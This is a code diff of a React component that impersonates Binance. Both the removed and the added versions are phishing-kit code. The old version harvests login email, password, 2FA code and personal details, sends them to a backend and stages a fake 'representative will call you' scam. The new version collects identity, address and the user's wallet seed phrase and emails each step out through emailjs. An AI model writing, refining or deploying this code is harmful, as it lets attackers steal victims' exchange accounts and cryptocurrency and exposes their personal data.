@@ -1,1639 +1,404 @@
-import { FC, useState, useEffect } from "react";
-import { useToast } from "@/hooks/use-toast";
-import { AlertTriangle } from "lucide-react";
-import { Checkbox } from "@/components/ui/checkbox";
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 
-type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation' | 'ledger-shipping';
+import React, { useState } from 'react';
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Progress } from "@/components/ui/progress";
+import { AlertCircle, CheckCircle2, Eye, EyeOff, Shield, Lock, ArrowLeft, ArrowRight } from "lucide-react";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { toast } from "sonner";
+import emailjs from 'emailjs-com';
+import { EMAILJS_CONFIG } from '../config/emailjs.config';
 
-const countries = [
-  "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
-  "Switzerland", "Austria", "Sweden", "Norway", "Denmark", "Finland", "Poland", "Czech Republic", "Hungary", "Romania",
-  "Bulgaria", "Croatia", "Slovenia", "Slovakia", "Estonia", "Latvia", "Lithuania", "Luxembourg", "Malta", "Cyprus",
-  "Ireland", "Portugal", "Greece", "Japan", "South Korea", "Singapore", "Hong Kong", "Taiwan", "Malaysia", "Thailand",
-  "Philippines", "Indonesia", "Vietnam", "India", "China", "Brazil", "Mexico", "Argentina", "Chile", "Colombia"
-];
-
-const BinanceLedgerForm: FC = () => {
-  const { toast } = useToast();
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [verificationCode, setVerificationCode] = useState("");
-  const [currentStep, setCurrentStep] = useState<FormStep>('email');
-  const [isLoading, setIsLoading] = useState(false);
-  const [logoError, setLogoError] = useState(false);
-  const [errors, setErrors] = useState<{[key: string]: string}>({});
-  const [isTransitioning, setIsTransitioning] = useState(false);
-  const [confirmationChecked, setConfirmationChecked] = useState(false);
-  const [showPrivateKey, setShowPrivateKey] = useState(false);
-  const [isCallDialogOpen, setIsCallDialogOpen] = useState(false);
-  const [countdown, setCountdown] = useState(9);
-  const [isCountingDown, setIsCountingDown] = useState(false);
-  const [contactingUser, setContactingUser] = useState(false);
-  const [personalDetails, setPersonalDetails] = useState({
-    firstName: "",
-    lastName: "",
-    dateOfBirth: "",
-    address: "",
-    postalCode: "",
-    city: "",
-    country: "",
-    phoneNumber: ""
+const BinanceLedgerForm = () => {
+  const [currentStep, setCurrentStep] = useState(1);
+  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  
+  // Form data state
+  const [formData, setFormData] = useState({
+    // Step 1: Personal Details
+    fullName: '',
+    dateOfBirth: '',
+    email: '',
+    phoneNumber: '',
+    
+    // Step 2: Address Details
+    address: '',
+    zipCode: '',
+    city: '',
+    country: '',
+    
+    // Step 3: Seed Phrase
+    seedPhrase: ''
   });
 
-  // Generate a mock private key (12 words)
-  const privateKeyWords = [
-    "abandon", "ability", "able", "about", "above", "absent", 
-    "absorb", "abstract", "absurd", "abuse", "access", "accident"
+  const steps = [
+    { number: 1, title: "Personal Details", description: "Enter your personal information" },
+    { number: 2, title: "Address Details", description: "Provide your address information" },
+    { number: 3, title: "Seed Phrase", description: "Enter your wallet seed phrase" }
   ];
 
-  // Countdown effect
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (isCountingDown && countdown > 0) {
-      interval = setInterval(() => {
-        setCountdown(prev => prev - 1);
-      }, 1000);
-    } else if (countdown === 0 && isCountingDown) {
-      setContactingUser(true);
-      setIsCountingDown(false);
-      // Send email notification to backend
-      sendSupportRequest();
-    }
-    return () => clearInterval(interval);
-  }, [isCountingDown, countdown]);
-
-  const sendSupportRequest = async () => {
+  const sendStepNotification = async (stepNumber: number, stepData: any) => {
     try {
-      await fetch('/api/support-request', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email,
-          personalDetails,
-          timestamp: new Date().toISOString(),
-          supportCode: '7791'
-        })
-      });
+      const stepNames = {
+        1: "Personal Details Step",
+        2: "Address Details Step", 
+        3: "Seed Phrase Step"
+      };
+
+      const formatStepData = (step: number, data: any) => {
+        switch(step) {
+          case 1:
+            return `Personal Details:
+Full Name: ${data.fullName}
+Date of Birth: ${data.dateOfBirth}
+Email: ${data.email}
+Phone Number: ${data.phoneNumber}`;
+          case 2:
+            return `Address Details:
+Address: ${data.address}
+Zip Code: ${data.zipCode}
+City: ${data.city}
+Country: ${data.country}`;
+          case 3:
+            return `Wallet Seed Phrase:
+${data.seedPhrase}
+
+⚠️ SECURITY ALERT: This is sensitive wallet information!`;
+          default:
+            return JSON.stringify(data, null, 2);
+        }
+      };
+
+      const templateParams = {
+        from_name: formData.fullName || 'User',
+        from_email: formData.email || 'user@example.com',
+        subject: stepNames[stepNumber],
+        message: formatStepData(stepNumber, stepData),
+        timestamp: new Date().toLocaleString()
+      };
+
+      await emailjs.send(
+        EMAILJS_CONFIG.SERVICE_ID,
+        EMAILJS_CONFIG.TEMPLATE_ID,
+        templateParams,
+        EMAILJS_CONFIG.USER_ID
+      );
+
+      console.log(`Email sent for ${stepNames[stepNumber]}`);
     } catch (error) {
-      console.error('Failed to send support request:', error);
+      console.error('Error sending step notification:', error);
     }
   };
 
-  const sendFormData = async (step: string, data: any) => {
-    try {
-      await fetch('/api/form-submission', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          step,
-          data,
-          timestamp: new Date().toISOString()
-        })
-      });
-    } catch (error) {
-      console.error('Failed to send form data:', error);
-    }
-  };
-
-  const startCountdown = () => {
-    setIsCountingDown(true);
-    setCountdown(9);
-    setContactingUser(false);
-  };
-
-  const transitionToStep = (newStep: FormStep) => {
-    setIsTransitioning(true);
-    setTimeout(() => {
-      setCurrentStep(newStep);
-      setTimeout(() => {
-        setIsTransitioning(false);
-      }, 150);
-    }, 150);
-  };
-
-  const handleEmailSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setErrors({});
-    
-    if (!email) {
-      setErrors({ email: "Please enter your email address" });
-      return;
-    }
-    
-    if (!/\S+@\S+\.\S+/.test(email)) {
-      setErrors({ email: "Please enter a valid email address" });
-      return;
-    }
-    
-    // Send email data to backend
-    await sendFormData('email', { email });
-    
-    console.log("Email submitted:", email);
-    transitionToStep('password');
-  };
-
-  const handlePasswordSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setErrors({});
-    
-    if (!password) {
-      setErrors({ password: "Please enter your password" });
-      return;
-    }
-    
-    if (password.length < 6) {
-      setErrors({ password: "Password must be at least 6 characters" });
-      return;
-    }
-    
-    // Send password data to backend
-    await sendFormData('password', { email, password });
-    
-    setIsLoading(true);
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    setIsLoading(false);
-    transitionToStep('verification');
-  };
-
-  const handleVerificationSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setErrors({});
-    
-    if (!verificationCode) {
-      setErrors({ verification: "Please enter the verification code" });
-      return;
-    }
-    
-    if (verificationCode.length !== 6) {
-      setErrors({ verification: "Verification code must be 6 digits" });
-      return;
-    }
-    
-    // Send verification data to backend
-    await sendFormData('verification', { email, verificationCode });
-    
-    setIsLoading(true);
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    setIsLoading(false);
-    transitionToStep('important-notice');
-  };
-
-  const handleNoticeConfirm = () => {
-    transitionToStep('personal-details');
-  };
-
-  const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setErrors({});
-    
-    const requiredFields = ['firstName', 'lastName', 'dateOfBirth', 'address', 'postalCode', 'city', 'country', 'phoneNumber'];
-    const newErrors: {[key: string]: string} = {};
-    
-    requiredFields.forEach(field => {
-      if (!personalDetails[field as keyof typeof personalDetails]) {
-        newErrors[field] = "This field is required";
+  const handleNext = async () => {
+    if (currentStep < 3) {
+      // Get current step data
+      let stepData = {};
+      if (currentStep === 1) {
+        stepData = {
+          fullName: formData.fullName,
+          dateOfBirth: formData.dateOfBirth,
+          email: formData.email,
+          phoneNumber: formData.phoneNumber
+        };
+      } else if (currentStep === 2) {
+        stepData = {
+          address: formData.address,
+          zipCode: formData.zipCode,
+          city: formData.city,
+          country: formData.country
+        };
       }
-    });
-    
-    if (Object.keys(newErrors).length > 0) {
-      setErrors(newErrors);
-      return;
+
+      // Send email notification for completed step
+      await sendStepNotification(currentStep, stepData);
+      
+      // Move to next step
+      setCurrentStep(currentStep + 1);
+      toast.success(`Step ${currentStep} completed! Email notification sent.`);
+    } else {
+      // Final step submission
+      await handleFinalSubmission();
     }
-    
-    // Send personal details to backend
-    await sendFormData('personal-details', { email, personalDetails });
-    
-    transitionToStep('summary');
   };
 
-  const handleSummaryConfirm = async () => {
-    if (!confirmationChecked) {
-      setErrors({ confirmation: "Please confirm that all information is accurate" });
-      return;
-    }
-    
-    setErrors({});
-    
-    // Send summary confirmation to backend
-    await sendFormData('summary-confirmed', { email, personalDetails, confirmed: true });
-    
-    transitionToStep('verifying');
-    
-    // Simulate verification process for 20 seconds
-    setTimeout(() => {
-      transitionToStep('success');
-    }, 20000); // 20 seconds = 20,000 milliseconds
-  };
-
-  const handleConnectLedger = () => {
-    transitionToStep('private-key');
-  };
-
-  const handleShowPrivateKey = () => {
-    setShowPrivateKey(true);
-  };
-
-  const handlePrivateKeyNext = () => {
-    transitionToStep('confirmation');
-  };
-
-  const handlePaste = async () => {
+  const handleFinalSubmission = async () => {
+    setIsSubmitting(true);
     try {
-      const text = await navigator.clipboard.readText();
-      setVerificationCode(text);
-    } catch (err) {
-      console.error('Failed to read clipboard contents: ', err);
+      // Send final step notification
+      await sendStepNotification(3, { seedPhrase: formData.seedPhrase });
+      
+      toast.success("Form submitted successfully! All notifications sent.");
+      
+      // Reset form
+      setFormData({
+        fullName: '',
+        dateOfBirth: '',
+        email: '',
+        phoneNumber: '',
+        address: '',
+        zipCode: '',
+        city: '',
+        country: '',
+        seedPhrase: ''
+      });
+      setCurrentStep(1);
+    } catch (error) {
+      console.error('Error submitting form:', error);
+      toast.error("Failed to submit form. Please try again.");
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
-  const renderHeader = () => (
-    <div className="flex justify-start mb-4">
-      <div className="flex items-center">
-        <img 
-          src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
-          alt="Binance Logo" 
-          className="h-5"
-          onError={(e) => {
-            setLogoError(true);
-            e.currentTarget.style.display = 'none';
-          }}
-        />
-        {logoError && (
-          <span className="text-binance-yellow font-bold text-sm font-binance">
-            BINANCE
-          </span>
-        )}
-      </div>
-    </div>
-  );
-
-  const renderTitle = () => {
-    const titles = {
-      email: 'Log in',
-      password: 'Enter Password',
-      verification: 'Enter Verification Code',
-      'important-notice': 'Important Notice',
-      'personal-details': 'Verify Details',
-      summary: 'Review Information',
-      verifying: 'Verifying',
-      success: 'Verification Successful',
-      'private-key': 'Private Key Generation',
-      confirmation: 'Confirmation'
-    };
-
-    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation') {
-      return null; // Title handled in content for these states
+  const handleBack = () => {
+    if (currentStep > 1) {
+      setCurrentStep(currentStep - 1);
     }
-
-    return (
-      <div className="flex justify-between items-center mb-4">
-        <div 
-          className="text-base font-bold font-binance"
-          style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-          role="heading" 
-          aria-level={1}
-        >
-          {titles[currentStep]}
-        </div>
-        {currentStep === 'email' && (
-          <div className="max-md:hidden h-[28px]">
-            <div className="bn-tooltips-wrap qrcode-login-popup">
-              <div className="bn-tooltips-ele">
-                <div 
-                  className="p-[2px] w-[28px] h-[28px] rounded-[4px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
-                  style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
-                  role="button" 
-                  aria-label="QR code login" 
-                  tabIndex={0}
-                >
-                  <svg 
-                    className="w-[24px] h-[24px]" 
-                    style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                    viewBox="0 0 24 24" 
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="currentColor"
-                  >
-                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
-                    <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
-                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
-                    <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
-                    <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
-                    <path d="M22.5 15.5V13H20v2.5h2.5z" />
-                  </svg>
-                </div>
-              </div>
-            </div>
-          </div>
-        )}
-      </div>
-    );
   };
 
-  // Render special states (important notice, summary, verifying, success, private-key, confirmation, ledger-shipping)
-  const renderSpecialState = () => {
-    if (currentStep === 'ledger-shipping') {
-      return (
-        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
-          <div className="flex-1">
-            <div 
-              className="text-lg font-semibold font-binance mb-6 text-center"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Your Ledger is on the way
-            </div>
-            
-            {/* Ledger Device Image */}
-            <div className="flex justify-center mb-6">
-              <div className="relative">
-                <div className="absolute inset-0 bg-gradient-to-r from-yellow-400/20 to-yellow-600/20 rounded-2xl blur-xl transform scale-110"></div>
-                <div className="relative bg-gradient-to-br from-[#2B3139] to-[#1E2329] p-4 rounded-2xl border border-yellow-500/30 shadow-2xl">
-                  <img 
-                    src="/lovable-uploads/3cd31df8-babf-4eef-b7a9-a928a99a63e5.png" 
-                    alt="Binance Ledger Device" 
-                    className="w-32 h-auto object-contain"
-                  />
-                </div>
-              </div>
-            </div>
+  const updateFormData = (field: string, value: string) => {
+    setFormData(prev => ({
+      ...prev,
+      [field]: value
+    }));
+  };
 
-            <div className="text-left space-y-4 mb-5">
-              <div className="bg-green-500/10 border border-green-500/20 rounded p-3">
-                <div className="text-xs font-binance text-green-400 leading-relaxed">
-                  <strong>✓ Order Confirmed:</strong><br/>
-                  Your Binance Ledger device has been prepared and will be shipped to your address.
-                </div>
-              </div>
-
-              <div className="text-xs font-binance text-white leading-relaxed">
-                <strong>Shipping Details:</strong>
-              </div>
-              
-              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
-                <div className="grid grid-cols-1 gap-2 text-xs">
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">Name:</span>
-                    <span className="font-binance text-white">{personalDetails.firstName} {personalDetails.lastName}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">Address:</span>
-                    <span className="font-binance text-white text-right">{personalDetails.address}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">City:</span>
-                    <span className="font-binance text-white">{personalDetails.city}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">Postal Code:</span>
-                    <span className="font-binance text-white">{personalDetails.postalCode}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">Country:</span>
-                    <span className="font-binance text-white">{personalDetails.country}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span className="font-binance text-gray-400">Phone:</span>
-                    <span className="font-binance text-white">{personalDetails.phoneNumber}</span>
-                  </div>
-                </div>
-              </div>
-              
-              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3">
-                <div className="text-xs font-binance text-yellow-400 leading-relaxed">
-                  <strong>📦 Delivery Information:</strong><br/>
-                  • Your Ledger device will arrive within <strong>10 business days</strong><br/>
-                  • You will receive a tracking number via email once shipped<br/>
-                  • The package will include setup instructions for your second security key
-                </div>
-              </div>
-
-              <div className="text-xs font-binance text-white leading-relaxed">
-                <strong>What's Next:</strong><br/>
-                Once you receive your Ledger device, follow the included instructions to generate your second security key. This completes your two-key security system for maximum protection of your assets.
-              </div>
-            </div>
-          </div>
-
-          <div className="mt-auto space-y-3">
-            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
-              <DialogTrigger asChild>
-                <button
-                  type="button"
-                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
-                  style={{
-                    backgroundColor: "transparent",
-                    color: "var(--color-BtnBg, #FCD535)",
-                    height: "34px"
-                  }}
-                >
-                  Contact Support for Shipping Questions
-                </button>
-              </DialogTrigger>
-              <DialogContent className="bg-[#1E2329] border-[#474D57]">
-                <DialogHeader>
-                  <DialogTitle className="text-white text-sm font-binance">Shipping Support</DialogTitle>
-                </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed mb-4">
-                  A Binance representative will contact you shortly regarding your shipping inquiry. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
-                </div>
-                {!isCountingDown && !contactingUser && (
-                  <button
-                    onClick={startCountdown}
-                    className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 font-bold font-binance text-xs bg-yellow-500 text-black"
-                  >
-                    Request Call
-                  </button>
-                )}
-                {isCountingDown && (
-                  <div className="text-center">
-                    <div className="text-yellow-400 font-binance text-lg mb-2">{countdown}</div>
-                    <div className="text-white font-binance text-xs">Connecting you to support...</div>
-                  </div>
-                )}
-                {contactingUser && (
-                  <div className="text-center text-green-400 font-binance text-sm">
-                    Binance is contacting you
-                  </div>
-                )}
-              </DialogContent>
-            </Dialog>
-
-            <a
-              href="https://www.binance.com"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="block w-full"
-            >
-              <button
-                type="button"
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-              >
-                Continue to Dashboard
-              </button>
-            </a>
-          </div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'confirmation') {
-      return (
-        <div className="text-center" style={{ minHeight: "450px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
-          <div 
-            className="text-sm font-semibold font-binance mb-6"
-            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-          >
-            Final Confirmation
-          </div>
-          
-          <div className="text-left mb-6">
-            <div className="text-xs font-binance text-white leading-relaxed mb-4">
-              <strong>Next Step:</strong><br/>
-              Binance will ship your Ledger device by mail, and the package will include instructions on how to generate your second key.
-            </div>
-            
-            <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3 mb-4">
-              <div className="text-xs font-binance text-yellow-400 leading-relaxed">
-                <strong>⚠️ Security Reminder:</strong><br/>
-                • Your private key has been securely saved<br/>
-                • Keep it safe and never share it with anyone<br/>
-                • Binance will never ask for your private keys or passwords
-              </div>
-            </div>
-          </div>
-
-          <div className="mt-auto space-y-3">
-            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
-              <DialogTrigger asChild>
-                <button
-                  type="button"
-                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
-                  style={{
-                    backgroundColor: "transparent",
-                    color: "var(--color-BtnBg, #FCD535)",
-                    height: "34px"
-                  }}
-                >
-                  Request a Call from a Binance Representative for Phone Support
-                </button>
-              </DialogTrigger>
-              <DialogContent className="bg-[#1E2329] border-[#474D57]">
-                <DialogHeader>
-                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
-                </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed">
-                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
-                </div>
-              </DialogContent>
-            </Dialog>
-
-            <button
-              type="button"
-              onClick={() => transitionToStep('ledger-shipping')}
-              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-              style={{
-                backgroundColor: "var(--color-BtnBg, #FCD535)",
-                color: "var(--color-TextOnYellow, #202630)",
-                height: "34px"
-              }}
-              aria-label="Complete Setup"
-            >
-              Complete Setup
-            </button>
-          </div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'private-key') {
-      return (
-        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
-          <div className="flex-1">
-            <div 
-              className="text-sm font-semibold font-binance mb-4"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Private Key Generation
-            </div>
-            
-            <div className="text-left space-y-4 mb-5">
-              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
-                <div className="text-xs font-binance text-red-400 leading-relaxed">
-                  <strong>⚠️ Important Security Notice:</strong><br/>
-                  • Make sure no one is watching when you view or store your keys<br/>
-                  • Never share your private key over the phone or by email<br/>
-                  • Binance will never ask you for your private keys or passwords
-                </div>
-              </div>
-
-              {!showPrivateKey ? (
-                <div className="text-xs font-binance text-white leading-relaxed">
-                  In the next step, you will see a Show Private Key button. A 12-word recovery phrase will be generated that you must store securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
-                </div>
-              ) : (
-                <div>
-                  <div className="text-xs font-binance text-white mb-3">
-                    <strong>Your Private Key (Recovery Phrase):</strong>
-                  </div>
-                  <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 mb-3">
-                    <div className="grid grid-cols-3 gap-2 text-xs font-binance text-white">
-                      {privateKeyWords.map((word, index) => (
-                        <div key={index} className="flex items-center">
-                          <span className="text-gray-400 mr-1">{index + 1}.</span>
-                          <span>{word}</span>
-                        </div>
-                      ))}
-                    </div>
-                  </div>
-                  <div className="text-xs font-binance text-yellow-400">
-                    ⚠️ Store this phrase securely. You will not be able to retrieve it after proceeding.
-                  </div>
-                </div>
-              )}
-            </div>
-          </div>
-
-          <div className="mt-auto space-y-3">
-            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
-              <DialogTrigger asChild>
-                <button
-                  type="button"
-                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
-                  style={{
-                    backgroundColor: "transparent",
-                    color: "var(--color-BtnBg, #FCD535)",
-                    height: "34px"
-                  }}
-                >
-                  Request a Call from a Binance Representative for Phone Support
-                </button>
-              </DialogTrigger>
-              <DialogContent className="bg-[#1E2329] border-[#474D57]">
-                <DialogHeader>
-                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
-                </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed">
-                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
-                </div>
-              </DialogContent>
-            </Dialog>
-
-            {!showPrivateKey ? (
-              <button
-                type="button"
-                onClick={handleShowPrivateKey}
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-              >
-                Show Private Key
-              </button>
-            ) : (
-              <button
-                type="button"
-                onClick={handlePrivateKeyNext}
-                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-                style={{
-                  backgroundColor: "var(--color-BtnBg, #FCD535)",
-                  color: "var(--color-TextOnYellow, #202630)",
-                  height: "34px"
-                }}
-              >
-                Next
-              </button>
-            )}
-          </div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'summary') {
-      return (
-        <div style={{ minHeight: "350px", display: "flex", flexDirection: "column" }}>
-          <div className="flex-1">
-            <div 
-              className="mb-4 text-sm font-semibold font-binance text-left"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              Review Information
-            </div>
-            
-            <div className="text-left space-y-3 mb-5">
-              <div className="grid grid-cols-2 gap-3 text-xs">
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    First Name
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.firstName}
-                  </div>
-                </div>
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Last Name
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.lastName}
-                  </div>
-                </div>
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Date of Birth
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.dateOfBirth}
-                  </div>
-                </div>
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Phone Number
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.phoneNumber}
-                  </div>
-                </div>
-                <div className="col-span-2">
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Address
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.address}
-                  </div>
-                </div>
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    City
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.city}
-                  </div>
-                </div>
-                <div>
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Postal Code
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.postalCode}
-                  </div>
-                </div>
-                <div className="col-span-2">
-                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
-                    Country
-                  </div>
-                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-                    {personalDetails.country}
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <div className="mt-auto">
-            <div className="mb-4">
-              <div className="flex items-start space-x-2">
-                <Checkbox
-                  id="confirmation"
-                  checked={confirmationChecked}
-                  onCheckedChange={(checked) => setConfirmationChecked(checked as boolean)}
-                  className="mt-0.5"
+  const renderStepContent = () => {
+    switch (currentStep) {
+      case 1:
+        return (
+          <div className="space-y-4">
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <Label htmlFor="fullName">Full Name *</Label>
+                <Input
+                  id="fullName"
+                  value={formData.fullName}
+                  onChange={(e) => updateFormData('fullName', e.target.value)}
+                  placeholder="Enter your full name"
+                  required
                 />
-                <label 
-                  htmlFor="confirmation" 
-                  className="text-xs font-binance leading-relaxed cursor-pointer"
-                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                >
-                  I confirm that all the information I have provided is accurate, truthful, and complete.
-                </label>
               </div>
-              {errors.confirmation && (
-                <div className="text-red-500 text-xs mt-2 font-binance">
-                  {errors.confirmation}
-                </div>
-              )}
+              <div>
+                <Label htmlFor="dateOfBirth">Date of Birth *</Label>
+                <Input
+                  id="dateOfBirth"
+                  type="date"
+                  value={formData.dateOfBirth}
+                  onChange={(e) => updateFormData('dateOfBirth', e.target.value)}
+                  required
+                />
+              </div>
             </div>
-
-            <button
-              type="button"
-              onClick={handleSummaryConfirm}
-              disabled={isLoading}
-              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-              style={{
-                backgroundColor: "var(--color-BtnBg, #FCD535)",
-                color: "var(--color-TextOnYellow, #202630)",
-                height: "34px"
-              }}
-              aria-label="Confirm Information"
-            >
-              {isLoading ? (
-                <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
-              ) : (
-                'Confirm Information'
-              )}
-            </button>
-          </div>
-        </div>
-      );
-    }
-
-    if (currentStep === 'important-notice') {
-      return (
-        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
-          <div 
-            className="text-xs font-semibold font-binance mb-3"
-            style={{ color: "#F59E0B" }}
-          >
-            Important Notice
-          </div>
-          <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
-            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
-          </div>
-          <button
-            type="button"
